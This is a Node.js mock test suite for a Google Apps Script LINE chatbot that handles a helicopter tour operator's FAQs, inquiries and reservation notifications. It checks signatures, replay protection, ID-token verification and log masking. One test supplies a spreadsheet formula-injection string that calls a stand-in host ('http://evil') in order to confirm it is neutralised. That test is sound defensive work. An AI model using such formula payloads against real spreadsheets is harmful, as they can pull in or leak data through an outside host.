/**
 * GAS ロジックのモックテスト（node --test）。
 * 外部サービス（LINE / Google）は呼び出さない。実環境テストは docs/deployment.md の手順で別途実施する。
 */
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { createGasEnv, relayEnvelope, reservationEnvelope } = require('./helpers/gas-env');

const TOKEN = 'test-channel-access-token-SECRET';
const RELAY = 'relay-shared-secret';
const RESV = 'reservation-webhook-secret';
const USER = 'U' + 'a'.repeat(32);
const OTHER = 'U' + 'b'.repeat(32);
const ADMIN = 'U' + 'c'.repeat(32);

function baseProps(extra) {
  return Object.assign({
    LINE_CHANNEL_ACCESS_TOKEN: TOKEN,
    RELAY_SHARED_SECRET: RELAY,
    RESERVATION_WEBHOOK_SECRET: RESV,
    LINE_LOGIN_CHANNEL_ID: '1234567890'
  }, extra || {});
}

function lineOk(url) {
  if (url.indexOf('/v2/bot/profile/') !== -1) return { code: 200, body: { displayName: 'テスト太郎', language: 'ja' } };
  return { code: 200, body: {} };
}

function envWith(opts = {}) {
  const env = createGasEnv({ props: baseProps(opts.props), fetch: opts.fetch || lineOk });
  return env;
}

let evtSeq = 0;
function textEvent(text, userId = USER, id) {
  return { type: 'message', webhookEventId: id || 'evt-' + (++evtSeq), replyToken: 'rt-' + evtSeq, source: { type: 'user', userId },
    message: { type: 'text', text }, deliveryContext: { isRedelivery: false } };
}
function postbackEvent(data, userId = USER) {
  return { type: 'postback', webhookEventId: 'evt-' + (++evtSeq), replyToken: 'rt-' + evtSeq, source: { type: 'user', userId }, postback: { data } };
}
function send(env, events) {
  return env.doPost(relayEnvelope({ destination: 'Uxxx', events: [].concat(events) }, RELAY));
}
function lastReply(env) {
  const r = env.linePosts('/v2/bot/message/reply');
  return r[r.length - 1].json;
}
function replyText(env) {
  return lastReply(env).messages.map((m) => m.text || (m.template && m.template.text) || '').join('\n');
}

/* ---------- Webhook / 署名 ---------- */

test('Webhook 検証（events 空）は ok を返す', () => {
  const env = envWith();
  assert.deepEqual(send(env, []).ok, true);
});

test('リレー署名が不正なら処理しない', () => {
  const env = envWith();
  const e = relayEnvelope({ events: [textEvent('予約')] }, 'wrong-secret');
  assert.equal(env.doPost(e).error, 'bad_signature');
  assert.equal(env.linePosts('/reply').length, 0);
});

test('古いタイムスタンプ（リプレイ）は拒否', () => {
  const env = envWith();
  const e = relayEnvelope({ events: [textEvent('予約')] }, RELAY, Date.now() - 10 * 60 * 1000);
  assert.equal(env.doPost(e).error, 'stale');
});

test('LINE からの直接 Webhook は HtmlService（HTTP 200）で応答。relay モードでは処理しない', () => {
  const env = envWith({ props: { WEBHOOK_MODE: 'relay' } });
  const out = env.doPost({ destination: 'U' + '0'.repeat(32), events: [] });
  assert.equal(out.__html, true);
  assert.equal(env.fetchCalls.length, 0);
});

test('同一 webhookEventId の再送は二重応答しない', () => {
  const env = envWith();
  const ev = textEvent('予約', USER, 'dup-1');
  send(env, ev);
  const redelivered = Object.assign({}, ev, { deliveryContext: { isRedelivery: true } });
  const r = send(env, redelivered);
  assert.equal(r.skipped, 1);
  assert.equal(env.linePosts('/v2/bot/message/reply').length, 1);
});

test('必須設定（RELAY_SHARED_SECRET）不足時は安全に停止', () => {
  const env = createGasEnv({ props: { LINE_CHANNEL_ACCESS_TOKEN: TOKEN }, fetch: lineOk });
  const r = env.doPost(relayEnvelope({ events: [textEvent('予約')] }, RELAY));
  assert.equal(r.error, 'not_configured');
  assert.equal(env.fetchCalls.length, 0);
});

test('アクセストークン未設定時は LINE API を呼ばずエラーログのみ', () => {
  const env = createGasEnv({ props: { RELAY_SHARED_SECRET: RELAY }, fetch: lineOk });
  const r = send(env, textEvent('予約'));
  assert.equal(r.ok, true);
  assert.equal(env.fetchCalls.length, 0);
  assert.ok(env.logs.some((l) => l.indexOf('LINE_CHANNEL_ACCESS_TOKEN') !== -1));
});

/* ---------- 友だち追加 ---------- */

test('友だち追加であいさつを送信し顧客管理に登録', () => {
  const env = envWith();
  send(env, { type: 'follow', webhookEventId: 'f1', replyToken: 'rt-f', source: { type: 'user', userId: USER } });
  const msg = lastReply(env).messages[0];
  assert.match(msg.text, /SKY STANDARD公式LINE/);
  assert.ok(msg.quickReply.items.length >= 4);
  const c = env.rows('顧客管理');
  assert.equal(c.length, 1);
  assert.equal(c[0]['LINEユーザーID'], USER);
  assert.equal(c[0]['表示名'], 'テスト太郎');
  assert.equal(c[0]['友だち状態'], '友だち');
});

test('WELCOME テンプレートが OFF の場合は指定のあいさつ文を送信', () => {
  const env = envWith();
  env.sheets['通知テンプレート'].data[1][4] = 'OFF';
  send(env, { type: 'follow', webhookEventId: 'f2', replyToken: 'rt', source: { type: 'user', userId: USER } });
  assert.equal(lastReply(env).messages[0].text,
    'SKY STANDARD公式LINEへようこそ。\n\nヘリコプター遊覧飛行・チャーターサービスをご案内しています。\n\nフライトのご予約、予約確認、お問い合わせは、画面下のメニューからご利用ください。');
});

test('ブロック時は友だち状態をブロックに更新し、通知対象外にする', () => {
  const env = envWith();
  send(env, { type: 'follow', webhookEventId: 'f3', replyToken: 'rt', source: { type: 'user', userId: USER } });
  send(env, { type: 'unfollow', webhookEventId: 'u1', source: { type: 'user', userId: USER } });
  assert.equal(env.rows('顧客管理')[0]['友だち状態'], 'ブロック');
  assert.equal(env.ctx.isPushAllowed_(USER), false);
});

/* ---------- キーワード・FAQ ---------- */

test('「予約」: URL 設定済みなら予約サイトへのボタン', () => {
  const env = envWith();
  env.setSetting('BOOKING_SITE_URL', 'https://booking.example.jp/');
  send(env, textEvent('予約'));
  const m = lastReply(env).messages[0];
  assert.equal(m.template.actions[0].uri, 'https://booking.example.jp/');
});

test('「予約」: URL 未設定ならダミー URL を出さず準備中と案内', () => {
  const env = envWith();
  send(env, textEvent('予約したい'));
  const s = JSON.stringify(lastReply(env));
  assert.match(s, /準備中/);
  assert.doesNotMatch(s, /"uri"/);
});

test('http の URL は無効として扱う', () => {
  const env = envWith();
  env.setSetting('BOOKING_SITE_URL', 'http://insecure.example.jp/');
  send(env, textEvent('予約'));
  assert.doesNotMatch(JSON.stringify(lastReply(env)), /insecure/);
});

test('表記揺れ（ひらがな・全角英字）を吸収', () => {
  const env = envWith();
  send(env, textEvent('よやく'));
  assert.match(replyText(env), /予約/);
  send(env, textEvent('ＦＡＱ'));
  assert.match(replyText(env), /よくある質問/);
});

test('優先順位: 「予約確認」は予約より優先され LIFF URL を返す', () => {
  const env = envWith();
  env.setSetting('LIFF_ID', '1234567890-AbCdEfGh');
  send(env, textEvent('予約確認したいです'));
  assert.equal(lastReply(env).messages[0].template.actions[0].uri, 'https://liff.line.me/1234567890-AbCdEfGh');
});

test('優先順位: 「キャンセル料はいくら？」はキャンセル FAQ を回答し有人導線を付ける', () => {
  const env = envWith();
  send(env, textEvent('キャンセル料はいくら？'));
  const m = lastReply(env).messages[0];
  assert.match(m.text, /キャンセル条件/);
  assert.match(m.text, /担当者/);
  assert.ok(m.quickReply.items.some((i) => i.action.data === 'a=inq_start'));
});

test('天候: FAQ（雨天・悪天候）を回答', () => {
  const env = envWith();
  send(env, textEvent('雨'));
  assert.match(replyText(env), /天候等により運航内容/);
});

test('料金: 金額を捏造せずプラン一覧へ誘導', () => {
  const env = envWith();
  send(env, textEvent('料金'));
  const s = replyText(env);
  assert.match(s, /プラン/);
  assert.doesNotMatch(s, /[0-9,]+円/);
});

test('FAQ: 一覧はクイックリプライ、postback で回答', () => {
  const env = envWith();
  send(env, textEvent('FAQ'));
  const qr = lastReply(env).messages[0].quickReply.items;
  assert.ok(qr.some((i) => i.action.data === 'a=faq&id=F001'));
  send(env, postbackEvent('a=faq&id=F002'));
  assert.match(replyText(env), /本人認証/);
});

test('FAQ: 有効=OFF の項目は回答しない', () => {
  const env = envWith();
  env.sheets['FAQ'].data[4][4] = 'OFF';
  send(env, textEvent('キャンセル料'));
  assert.doesNotMatch(replyText(env), /キャンセル条件はプラン・予約条件によって異なります。予約詳細/);
});

test('一致しない質問は担当者へ送る導線を出す', () => {
  const env = envWith();
  send(env, textEvent('ペットは同乗できますか'));
  const m = lastReply(env).messages[0];
  assert.match(m.text, /見つかりませんでした/);
  assert.ok(m.quickReply.items.some((i) => i.action.data === 'a=inq_handoff'));
});

/* ---------- 問い合わせ ---------- */

test('問い合わせ: 種別選択 → 内容入力 → 保存・受付返信・運営通知', () => {
  const env = envWith();
  env.setSetting('ADMIN_NOTIFY_TARGET', ADMIN);
  send(env, textEvent('お問い合わせ'));
  const cats = lastReply(env).messages[0].quickReply.items.map((i) => i.action.label);
  assert.deepEqual(cats, ['フライト予約について', '予約内容の確認・変更', '天候・運航について', 'チャーター見積', 'その他のお問い合わせ']);

  send(env, postbackEvent('a=inq_cat&c=4'));
  assert.match(replyText(env), /チャーター見積/);
  send(env, textEvent('12/1に4名で東京から箱根へ'));

  const rows = env.rows('問い合わせ管理');
  assert.equal(rows.length, 1);
  assert.match(rows[0]['受付ID'], /^INQ-\d{8}-0001$/);
  assert.equal(rows[0]['種別'], 'チャーター見積');
  assert.equal(rows[0]['内容'], '12/1に4名で東京から箱根へ');
  assert.equal(rows[0]['対応状況'], '未対応');
  assert.equal(rows[0]['LINEユーザーID'], USER);

  const reply = replyText(env);
  assert.match(reply, new RegExp(rows[0]['受付ID']));
  assert.doesNotMatch(reply, /24時間|営業日以内|時間以内/);

  const push = env.linePosts('/v2/bot/message/push');
  assert.equal(push.length, 1);
  assert.equal(push[0].json.to, ADMIN);
  assert.match(push[0].json.messages[0].text, /【重要】/);
});

test('問い合わせ入力中にメニュー操作をした場合は入力を取り消してメニューを優先', () => {
  const env = envWith();
  send(env, postbackEvent('a=inq_cat&c=1'));
  send(env, textEvent('FAQ'));
  assert.equal(env.rows('問い合わせ管理').length, 0);
  assert.match(replyText(env), /よくある質問/);
});

test('担当者に送る: 未一致メッセージを問い合わせとして登録', () => {
  const env = envWith();
  send(env, textEvent('ペットは同乗できますか'));
  send(env, postbackEvent('a=inq_handoff'));
  const rows = env.rows('問い合わせ管理');
  assert.equal(rows.length, 1);
  assert.equal(rows[0]['内容'], 'ペットは同乗できますか');
  assert.match(rows[0]['備考'], /有人対応/);
});

test('問い合わせ内容の数式インジェクションを無害化', () => {
  const env = envWith();
  send(env, postbackEvent('a=inq_cat&c=5'));
  send(env, textEvent('=IMPORTXML("http://evil","//a")'));
  assert.equal(env.rows('問い合わせ管理')[0]['内容'].charAt(0), "'");
});

test('受付IDは連番で採番', () => {
  const env = envWith();
  for (let i = 0; i < 2; i++) { send(env, postbackEvent('a=inq_cat&c=5')); send(env, textEvent('質問' + i)); }
  const ids = env.rows('問い合わせ管理').map((r) => r['受付ID']);
  assert.ok(ids[0].endsWith('-0001') && ids[1].endsWith('-0002'));
});

/* ---------- リッチメニュー ---------- */

test('リッチメニュー定義: 6 領域が全面を重複なく覆う', () => {
  const env = envWith();
  const d = env.ctx.buildRichMenuDefinition_().definition;
  assert.equal(d.areas.length, 6);
  let area = 0;
  d.areas.forEach((a) => { area += a.bounds.width * a.bounds.height; });
  assert.equal(area, 2500 * 1686);
  assert.deepEqual([...d.areas.map((a) => a.action.label)], ['フライト予約', '予約確認', 'プラン一覧', 'チャーター', 'お問い合わせ', 'よくある質問']);
});

test('リッチメニュー: URL 未設定ボタンは postback（ダミー URL を使わない）', () => {
  const env = envWith();
  env.setSetting('BOOKING_SITE_URL', 'https://booking.example.jp/');
  const b = env.ctx.buildRichMenuDefinition_();
  assert.equal(b.definition.areas[0].action.type, 'uri');
  assert.deepEqual([...b.unset], ['予約確認', 'プラン一覧', 'チャーター']);
  assert.equal(b.definition.areas[2].action.type, 'postback');
  assert.equal(b.definition.areas[4].action.text, 'お問い合わせ');
  assert.equal(b.definition.areas[5].action.text, 'FAQ');
  send(env, postbackEvent('a=menu_unset&item=' + encodeURIComponent('プラン一覧')));
  assert.match(replyText(env), /準備中/);
});

test('公開設定は ID管理シートから取得（スクリプトプロパティの同名値より優先）', () => {
  const env = envWith({ props: { PLAN_LIST_URL: 'https://prop.example.jp/plans' } });
  env.setSetting('PLAN_LIST_URL', 'https://sheet.example.jp/plans');
  assert.equal(env.ctx.getUrlSetting_(env.ctx.SETTING_KEYS.PLANS_URL), 'https://sheet.example.jp/plans');
});

/* ---------- 予約確認（LIFF） ---------- */

function liffEnv(verify) {
  return envWith({
    fetch: (url, params) => {
      if (url.indexOf('/oauth2/v2.1/verify') !== -1) return verify(params.payload);
      return lineOk(url);
    }
  });
}
function okVerify(sub) {
  return (payload) => {
    if (payload.id_token !== 'good-token' || payload.client_id !== '1234567890') return { code: 400, body: { error: 'invalid_request' } };
    return { code: 200, body: { iss: 'https://access.line.me', sub, aud: '1234567890', exp: Math.floor(Date.now() / 1000) + 600 } };
  };
}
function seedReservations(env) {
  const d = env.sheets['予約管理'].data;
  d.push(['R-001', USER, 'P1', '東京ナイトクルーズ', '2026-12-01', '18:00', 2, 98000, '予約確定', '決済完了', 'https://admin.example/R-001', '']);
  d.push(['R-002', OTHER, 'P2', '富士山周遊', '2026-12-02', '10:00', 3, 150000, '予約確定', '未決済', 'https://admin.example/R-002', '']);
}

test('予約確認: ID トークン検証済み本人の予約のみ返し、運営用項目は返さない', () => {
  const env = liffEnv(okVerify(USER));
  seedReservations(env);
  const r = env.doPost({ kind: 'liff_api', action: 'list', idToken: 'good-token', userId: OTHER });
  assert.equal(r.ok, true);
  assert.equal(r.reservations.length, 1);
  assert.equal(r.reservations[0].reservationId, 'R-001');
  const s = JSON.stringify(r);
  assert.doesNotMatch(s, /R-002|admin\.example|Uaaaa/);
  const verifyCall = env.fetchCalls.find((c) => c.url.indexOf('verify') !== -1);
  assert.equal(verifyCall.params.method, 'post');
});

test('予約確認: 不正な ID トークン・未指定は auth_failed（予約を返さない）', () => {
  const env = liffEnv(okVerify(USER));
  seedReservations(env);
  assert.equal(env.doPost({ kind: 'liff_api', action: 'list', idToken: 'forged' }).error, 'auth_failed');
  assert.equal(env.doPost({ kind: 'liff_api', action: 'list', userId: USER }).error, 'auth_failed');
});

test('予約確認: aud が異なるトークンは拒否', () => {
  const env = liffEnv(() => ({ code: 200, body: { iss: 'https://access.line.me', sub: USER, aud: '999', exp: Math.floor(Date.now() / 1000) + 600 } }));
  assert.equal(env.doPost({ kind: 'liff_api', action: 'list', idToken: 'x' }).error, 'auth_failed');
});

test('予約確認: 予約がなければ空配列（ダミーデータを返さない）', () => {
  const env = liffEnv(okVerify('U' + 'd'.repeat(32)));
  seedReservations(env);
  const r = env.doPost({ kind: 'liff_api', action: 'list', idToken: 'good-token' });
  assert.deepEqual(r.reservations, []);
});

test('予約確認: LINE ログインチャネル ID 未設定なら not_configured', () => {
  const env = createGasEnv({ props: { LINE_CHANNEL_ACCESS_TOKEN: TOKEN }, fetch: lineOk });
  assert.equal(env.doPost({ kind: 'liff_api', action: 'list', idToken: 'good-token' }).error, 'not_configured');
});

test('予約確認: 予約サイト API 経由でも他人の予約が混入したら除外', () => {
  const env = envWith({
    props: { RESERVATION_API_BASE_URL: 'https://api.booking.example.jp', RESERVATION_API_KEY: 'k', RESERVATION_API_ALLOWED_HOST: 'api.booking.example.jp' },
    fetch: (url, params) => {
      if (url.indexOf('verify') !== -1) return okVerify(USER)(params.payload);
      if (url.indexOf('/line/reservations') !== -1) {
        assert.equal(params.headers.Authorization, 'Bearer k');
        return { code: 200, body: { reservations: [
          { reservationId: 'A1', lineUserId: USER, planName: 'X', status: 'confirmed', paymentStatus: 'paid' },
          { reservationId: 'A2', lineUserId: OTHER, planName: 'Y' }] } };
      }
      return lineOk(url);
    }
  });
  const r = env.doPost({ kind: 'liff_api', action: 'list', idToken: 'good-token' });
  assert.deepEqual(r.reservations.map((x) => x.reservationId), ['A1']);
  assert.equal(r.reservations[0].status, '予約確定');
  assert.equal(r.reservations[0].paymentStatus, '決済完了');
});

test('本人確認（紐付け）: 予約サイト API 未設定なら link_unavailable、試行回数制限あり', () => {
  const env = liffEnv(okVerify(USER));
  const req = { kind: 'liff_api', action: 'link', idToken: 'good-token', reservationId: 'R-9', contact: '09000000000' };
  assert.equal(env.doPost(req).error, 'link_unavailable');
  for (let i = 0; i < 4; i++) env.doPost(req);
  assert.equal(env.doPost(req).error, 'too_many_attempts');
});

test('本人確認（紐付け）: API が一致を返したら予約管理へ同期', () => {
  const env = envWith({
    props: { RESERVATION_API_BASE_URL: 'https://api.booking.example.jp', RESERVATION_API_KEY: 'k', RESERVATION_API_ALLOWED_HOST: 'api.booking.example.jp' },
    fetch: (url, params) => {
      if (url.indexOf('verify') !== -1) return okVerify(USER)(params.payload);
      if (url.indexOf('/line/link') !== -1) {
        const b = JSON.parse(params.payload);
        assert.equal(b.lineUserId, USER);
        return { code: 200, body: { linked: true, reservation: { reservationId: 'R-77', planName: 'Z', status: 'confirmed', flightDate: '2026-12-24' } } };
      }
      return lineOk(url);
    }
  });
  const r = env.doPost({ kind: 'liff_api', action: 'link', idToken: 'good-token', reservationId: 'R-77', contact: 'a@example.com' });
  assert.equal(r.ok, true);
  const row = env.rows('予約管理').find((x) => x['予約ID'] === 'R-77');
  assert.equal(row['LINEユーザーID'], USER);
});

/* ---------- 予約通知 ---------- */

function evt(type, id, extra) {
  return { eventId: id, eventType: type, occurredAt: new Date().toISOString(),
    reservation: Object.assign({ reservationId: 'R-100', lineUserId: USER, planName: '東京ナイトクルーズ', flightDate: '2026-12-01', timeSlot: '18:00', passengers: 2 }, extra || {}) };
}

test('予約受付と予約確定を区別して通知し、予約管理へ同期', () => {
  const env = envWith();
  assert.equal(env.doPost(reservationEnvelope(evt('BOOKING_RECEIVED', 'e1'), RESV)).result, '成功');
  assert.equal(env.rows('予約管理')[0]['予約状態'], '予約リクエスト受付');
  assert.equal(env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 'e2'), RESV)).result, '成功');
  const pushes = env.linePosts('/v2/bot/message/push');
  assert.equal(pushes.length, 2);
  assert.match(pushes[0].json.messages[0].text, /リクエストを受け付けました。予約ID：R-100/);
  assert.match(pushes[1].json.messages[0].text, /確定しました。予約ID：R-100／搭乗日時：2026-12-01 18:00/);
  assert.equal(pushes[1].json.to, USER);
  assert.ok(pushes[1].params.headers['X-Line-Retry-Key']);
  assert.equal(env.rows('予約管理').length, 1);
  assert.equal(env.rows('予約管理')[0]['予約状態'], '予約確定');
  const log = env.rows('送信ログ');
  assert.equal(log.length, 2);
  assert.equal(log[1]['冪等キー'], 'R-100:BOOKING_CONFIRMED:e2');
});

test('同じ予約イベントの再送は二重送信しない', () => {
  const env = envWith();
  const e = evt('BOOKING_CONFIRMED', 'same');
  env.doPost(reservationEnvelope(e, RESV));
  const r = env.doPost(reservationEnvelope(e, RESV));
  assert.equal(r.duplicate, true);
  assert.equal(env.linePosts('/v2/bot/message/push').length, 1);
});

test('予約イベントの署名不正・未知種別は拒否', () => {
  const env = envWith();
  assert.equal(env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 'x'), 'bad')).error, 'bad_signature');
  assert.equal(env.doPost(reservationEnvelope(evt('HACK', 'x'), RESV)).error, 'unknown_event_type');
  assert.equal(env.linePosts('/push').length, 0);
});

test('LINE ユーザー未連携の予約は「対象なし」として記録し送信しない', () => {
  const env = envWith();
  env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 'n1', { lineUserId: '' }), RESV));
  assert.equal(env.linePosts('/push').length, 0);
  assert.equal(env.rows('送信ログ')[0]['結果'], '対象なし');
});

test('テンプレート未登録（キャンセル）は送信せず記録。setupSheets 後も OFF のまま', () => {
  const env = envWith();
  env.doPost(reservationEnvelope(evt('BOOKING_CANCELLED', 'c1'), RESV));
  assert.equal(env.rows('送信ログ')[0]['結果'], 'テンプレート無効');
  env.ctx.setupSheets_();
  const t = env.rows('通知テンプレート').find((r) => r['テンプレートID'] === 'BOOKING_CANCELLED');
  assert.equal(t['有効'], 'OFF');
});

test('運航変更は承認待ち → 承認後に送信', () => {
  const env = envWith();
  env.setSetting('ADMIN_NOTIFY_TARGET', ADMIN);
  const r = env.doPost(reservationEnvelope(evt('FLIGHT_CHANGE', 'fc1'), RESV));
  assert.equal(r.result, '承認待ち');
  let toUser = env.linePosts('/push').filter((p) => p.json.to === USER);
  assert.equal(toUser.length, 0);
  const sendId = env.rows('送信ログ')[0]['送信ID'];
  const res = env.ctx.approvePendingNotification_(sendId, 'ops');
  assert.equal(res.result, '成功');
  toUser = env.linePosts('/push').filter((p) => p.json.to === USER);
  assert.equal(toUser.length, 1);
  assert.throws(() => env.ctx.approvePendingNotification_(sendId, 'ops'), /承認待ちではありません/);
});

test('通知失敗（5xx）は再試行待ち → 再送で成功', () => {
  let fail = true;
  const env = envWith({ fetch: (url) => (url.indexOf('/push') !== -1 && fail ? { code: 500, body: { message: 'err' } } : lineOk(url)) });
  env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 'r1'), RESV));
  assert.equal(env.rows('送信ログ')[0]['結果'], '失敗(再試行待ち)');
  assert.match(env.rows('送信ログ')[0]['エラー内容'], /500/);
  fail = false;
  env.ctx.retryFailedSends_();
  const row = env.rows('送信ログ')[0];
  assert.equal(row['結果'], '成功');
  assert.equal(row['再試行回数'], 1);
  // 再送でも同じ X-Line-Retry-Key を使う
  const keys = env.linePosts('/push').map((p) => p.params.headers['X-Line-Retry-Key']);
  assert.equal(new Set(keys).size, 1);
});

test('通知失敗（4xx）は再試行せず失敗として記録し運営へ通知', () => {
  const env = envWith({ fetch: (url, params) => {
    if (url.indexOf('/push') !== -1 && JSON.parse(params.payload).to === USER) return { code: 400, body: { message: 'Invalid' } };
    return lineOk(url);
  } });
  env.setSetting('ADMIN_NOTIFY_TARGET', ADMIN);
  env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 'r4'), RESV));
  assert.equal(env.rows('送信ログ')[0]['結果'], '失敗');
  assert.ok(env.linePosts('/push').some((p) => p.json.to === ADMIN && /通知の送信に失敗/.test(p.json.messages[0].text)));
});

test('搭乗前日リマインドは確定予約のみ・1回のみ送信', () => {
  const env = envWith();
  const tomorrow = env.ctx.Utilities.formatDate(new Date(Date.now() + 86400000), 'Asia/Tokyo', 'yyyy-MM-dd');
  const d = env.sheets['予約管理'].data;
  d.push(['R-1', USER, '', 'A', tomorrow, '10:00', 1, 1, '予約確定', '決済完了', '', '']);
  d.push(['R-2', OTHER, '', 'B', tomorrow, '11:00', 1, 1, '予約リクエスト受付', '', '', '']);
  d.push(['R-3', OTHER, '', 'C', '2099-01-01', '11:00', 1, 1, '予約確定', '', '', '']);
  assert.equal(env.ctx.sendFlightReminders_(), 1);
  assert.equal(env.ctx.sendFlightReminders_(), 0);
  assert.equal(env.linePosts('/push').length, 1);
});

/* ---------- データ保護・ログ ---------- */

test('setupSheets は既存データを保持し、不足列・設定行のみ追加', () => {
  const env = envWith();
  const before = JSON.stringify(env.sheets['FAQ'].data);
  const settingsBefore = env.sheets['LINE設定'].data.map((r) => r.slice());
  const idBefore = JSON.stringify(env.sheets['ID管理'].data);
  const r = env.ctx.setupSheets_();
  assert.equal(JSON.stringify(env.sheets['ID管理'].data), idBefore);
  assert.equal(r.spreadsheetIdSet, true);
  assert.equal(env.props.SPREADSHEET_ID, '1pzu1_-X8-Y7AhAq4ctwgfliYnImkPe6sa4d_TBth1Es');
  assert.equal(JSON.stringify(env.sheets['FAQ'].data), before);
  assert.deepEqual([...r.columns['送信ログ']], ['冪等キー', 'イベントID', '再試行回数']);
  assert.deepEqual([...r.columns['予約管理']], ['集合場所', '注意事項', '最終イベント日時']);
  settingsBefore.forEach((row, i) => assert.deepEqual(env.sheets['LINE設定'].data[i].slice(0, 3), row));
  assert.equal(r.idKeys.length, 0);
  assert.equal(r.missingSheets.length, 0);
  // 2回目は何も追加しない
  const r2 = env.ctx.setupSheets_();
  assert.equal(Object.keys(r2.columns).length, 0);
  assert.equal(r2.templates.length, 0);
});

test('ログにアクセストークン・メッセージ本文・ユーザーIDの全体を出力しない', () => {
  const env = envWith({ fetch: (url) => (url.indexOf('/reply') !== -1 ? { code: 500, body: { message: 'x' } } : lineOk(url)) });
  send(env, postbackEvent('a=inq_cat&c=5'));
  send(env, textEvent('私の電話番号は09012345678です'));
  const all = env.logs.join('\n');
  assert.doesNotMatch(all, new RegExp(TOKEN));
  assert.doesNotMatch(all, /09012345678/);
  assert.doesNotMatch(all, new RegExp(USER));
});

test('API エラーはログに記録される', () => {
  const env = envWith({ fetch: (url) => (url.indexOf('/reply') !== -1 ? { code: 400, body: { message: 'Invalid reply token' } } : lineOk(url)) });
  send(env, textEvent('予約'));
  assert.ok(env.logs.some((l) => /webhook\.event_failed/.test(l) && /Invalid reply token/.test(l)));
});

test('doGet は設定値を返さない', () => {
  const env = envWith();
  const out = JSON.parse(env.ctx.doGet({}).getContent());
  assert.equal(out.ok, true);
  assert.doesNotMatch(JSON.stringify(out), /token|secret/i);
});

/* ---------- レビュー指摘への回帰テスト ---------- */

test('キャンセル後に古い確定イベントが届いても状態を戻さず通知しない', () => {
  const env = envWith();
  const t0 = new Date(Date.now() - 60000).toISOString();
  const t1 = new Date().toISOString();
  env.doPost(reservationEnvelope(Object.assign(evt('BOOKING_CANCELLED', 'c9'), { occurredAt: t1 }), RESV));
  const r = env.doPost(reservationEnvelope(Object.assign(evt('BOOKING_CONFIRMED', 'c8'), { occurredAt: t0 }), RESV));
  assert.equal(r.result, '古いイベント(スキップ)');
  assert.equal(env.rows('予約管理')[0]['予約状態'], 'キャンセル');
  assert.equal(env.linePosts('/push').length, 0);
});

test('処理済みイベントのリプレイはシートを書き換えない', () => {
  const env = envWith();
  const e = evt('BOOKING_CONFIRMED', 'p1');
  env.doPost(reservationEnvelope(e, RESV));
  env.doPost(reservationEnvelope(Object.assign(evt('BOOKING_CANCELLED', 'p2')), RESV));
  env.doPost(reservationEnvelope(e, RESV));
  assert.equal(env.rows('予約管理')[0]['予約状態'], 'キャンセル');
});

test('ID・時刻・日付列はテキストとして保存（先頭0や時刻変換を防ぐ）', () => {
  const env = envWith();
  env.doPost(reservationEnvelope(evt('BOOKING_RECEIVED', 'z1', { reservationId: '00123' }), RESV));
  env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 'z2', { reservationId: '00123' }), RESV));
  const raw = env.sheets['予約管理'].data;
  assert.equal(raw.length, 2); // 重複行にならない
  assert.equal(raw[1][0], "'00123");
  assert.equal(raw[1][5], "'18:00");
});

test('処理中のまま放置された通知は再送対象になり、承認は二重に実行できない', () => {
  const env = envWith();
  env.doPost(reservationEnvelope(evt('FLIGHT_CHANGE', 's1'), RESV));
  const sendId = env.rows('送信ログ')[0]['送信ID'];
  env.ctx.approvePendingNotification_(sendId, 'a');
  assert.throws(() => env.ctx.approvePendingNotification_(sendId, 'b'));
  // 「処理中」で 20 分経過した行を再送
  env.doPost(reservationEnvelope(evt('BOOKING_CONFIRMED', 's2'), RESV));
  const d = env.sheets['送信ログ'].data;
  const h = d[0];
  d[2][h.indexOf('結果')] = '処理中';
  d[2][h.indexOf('送信日時')] = env.ctx.Utilities.formatDate(new Date(Date.now() - 20 * 60000), 'Asia/Tokyo', 'yyyy-MM-dd HH:mm:ss');
  env.ctx.savePendingPayload_(String(d[2][0]).replace(/^'/, ''), { userId: USER, templateId: 'BOOKING_CONFIRMED', type: 'BOOKING_CONFIRMED', idempotencyKey: 'k', vars: {} });
  env.ctx.retryFailedSends_();
  assert.equal(env.rows('送信ログ')[1]['結果'], '成功');
});

test('受付返信に失敗しても運営通知は送られ、Webhook 再送で二重登録しない', () => {
  const env = envWith({ fetch: (url) => (url.indexOf('/reply') !== -1 ? { code: 500, body: {} } : lineOk(url)) });
  env.setSetting('ADMIN_NOTIFY_TARGET', ADMIN);
  env.ctx.setInquiryState_(USER, { c: '5' });
  const ev = textEvent('相談内容', USER, 'inq-x');
  const r = send(env, ev);
  assert.equal(r.ok, true);
  assert.equal(env.rows('問い合わせ管理').length, 1);
  assert.ok(env.linePosts('/push').some((p) => p.json.to === ADMIN));
  assert.ok(env.linePosts('/push').some((p) => p.json.to === USER));
  send(env, ev);
  assert.equal(env.rows('問い合わせ管理').length, 1);
});

test('一時的な失敗（応答前の 5xx）は ok:false を返し LINE 再送で再処理できる', () => {
  let fail = true;
  const env = envWith({ fetch: (url) => (url.indexOf('/reply') !== -1 && fail ? { code: 500, body: {} } : lineOk(url)) });
  const ev = textEvent('予約', USER, 'tmp-1');
  assert.equal(send(env, ev).ok, false);
  fail = false;
  const r = send(env, ev);
  assert.equal(r.ok, true);
  assert.equal(r.handled, 1);
});

test('エラーログの URL に含まれる LINE ユーザーIDをマスク', () => {
  const env = envWith();
  env.ctx.logError_('x', new Error('Address unavailable: https://api.example/line/reservations?lineUserId=' + USER));
  assert.doesNotMatch(env.logs.join('\n'), new RegExp(USER));
});

test('廃止した ALLOW_UNSIGNED_WEBHOOK が残っていれば注意を表示（障害扱いにはしない）', () => {
  const env = envWith({ props: { ALLOW_UNSIGNED_WEBHOOK: 'true' } });
  const r = env.ctx.checkConfig_();
  assert.ok(r.warnings.some((w) => /ALLOW_UNSIGNED_WEBHOOK は廃止/.test(w)));
  assert.ok(!Object.keys(r.missing).some((k) => /Webhook/.test(k)));
});

test('5000 文字を超えるテキストは切り詰めて送信', () => {
  const env = envWith();
  env.sheets['FAQ'].data[1][3] = 'あ'.repeat(6000);
  send(env, textEvent('予約方法'));
  assert.ok(lastReply(env).messages[0].text.length <= 5000);
});
